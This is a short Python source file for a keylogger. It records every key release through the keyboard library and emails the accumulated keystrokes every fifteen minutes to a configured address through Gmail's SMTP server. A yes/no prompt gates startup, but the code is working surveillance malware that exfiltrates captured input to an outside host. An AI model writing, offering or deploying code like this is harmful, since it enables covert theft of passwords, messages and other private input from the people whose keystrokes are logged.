import keyboard
import smtplib
from threading import Timer

Report_Interval = 900
Email = "Email_Address"
Password = "Email_Password"

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""

    def Call_Helper(self, event):
        name = event.name
        if len(name) > 1 and name != "space":
            name = f"[{name.upper()}]" if name != "enter" else "[ENTER]\n"
        self.log += name

    def Mail(self, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(Email, Password)
        server.sendmail(Email, Email, message)
        server.quit()

    def Report(self):
        if self.log:
            self.Mail(self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.Report).start()

    def Permission(self):
        permission = input("Do you want to start the keylogger? (yes/no): ")
        if permission.lower() != "yes":
            print("Keylogger not started.")
            return
        keyboard.on_release(callback=self.Call_Helper)
        self.Report()

if __name__ == "__main__":
    keylogger = Keylogger(interval=Report_Interval)
    try:
        keylogger.Permission()
    finally:
        keyboard.unhook_all()
